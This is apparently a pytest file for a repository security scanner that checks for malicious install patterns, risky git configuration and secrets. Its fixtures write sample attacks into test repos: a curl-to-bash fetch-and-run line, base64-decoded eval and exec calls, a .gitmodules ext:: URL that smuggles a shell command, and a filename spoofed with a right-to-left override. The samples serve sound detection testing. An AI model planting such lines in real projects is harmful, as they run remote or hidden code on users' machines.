import importlib.util
import subprocess
from pathlib import Path
from unittest.mock import patch

_SCRIPT_PATH = Path(__file__).resolve().parent.parent / "vm_scripts" / "analyze.py"


def _load_analyze_module():
    spec = importlib.util.spec_from_file_location("analyze", _SCRIPT_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze = _load_analyze_module()


def _init_repo(tmp_path: Path) -> Path:
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_dir, check=True)
    return repo_dir


def test_scan_malicious_patterns_finds_curl_pipe_bash(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text(
        "#!/bin/sh\ncurl https://example.com/payload.sh | bash\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "curl_pipe_shell"
    assert findings[0]["file"] == "install.sh"
    assert findings[0]["line"] == 2
    assert "curl" in findings[0]["snippet"]


def test_scan_malicious_patterns_finds_js_eval_decoded(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "postinstall.js").write_text(
        "eval(Buffer.from('c29tZSBjb2Rl', 'base64').toString());\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "js_eval_decoded"
    assert findings[0]["file"] == "postinstall.js"


def test_scan_malicious_patterns_finds_python_exec_base64(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text(
        "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "python_exec_base64"


def test_scan_malicious_patterns_ignores_clean_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "main.py").write_text("print('hello world')\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_binary_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "payload.bin").write_bytes(
        b"curl https://example.com/x | bash\x00\x01\x02"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    fake_hook_dir = repo_dir / ".git" / "hooks"
    fake_hook_dir.mkdir(parents=True, exist_ok=True)
    (fake_hook_dir / "fake-hook").write_text("curl https://example.com/x | bash\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_git_specifics_finds_gitmodules_ext_transport(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitmodules").write_text(
        '[submodule "evil"]\n'
        "\tpath = evil\n"
        "\turl = ext::sh -c 'touch /tmp/pwned'\n"
    )

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitmodules_ext_transport" in rules


def test_scan_git_specifics_finds_gitattributes_custom_filter(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitattributes").write_text("*.secret filter=my-custom-filter\n")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitattributes_custom_filter" in rules


def test_scan_git_specifics_finds_nested_git_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    nested = repo_dir / "vendor" / ".git"
    nested.mkdir(parents=True)

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "nested_git_path" in rules
    nested_finding = next(f for f in findings if f["rule"] == "nested_git_path")
    assert nested_finding["file"] == "vendor/.git"


def test_scan_git_specifics_finds_suspicious_filename_characters(tmp_path):
    repo_dir = _init_repo(tmp_path)
    suspicious_name = "invoice‮gpj.exe"
    (repo_dir / suspicious_name).write_text("not actually an image")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "suspicious_filename_characters" in rules


def test_scan_git_specifics_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_git_specifics(repo_dir)

    assert findings == []


def test_scan_secrets_finds_aws_key(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1
    assert findings[0]["snippet"] == ""


def test_scan_secrets_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
    repo_dir = _init_repo(tmp_path)

    with patch.object(
        analyze.subprocess, "run", side_effect=FileNotFoundError("no such file")
    ):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "scanner_not_executed"
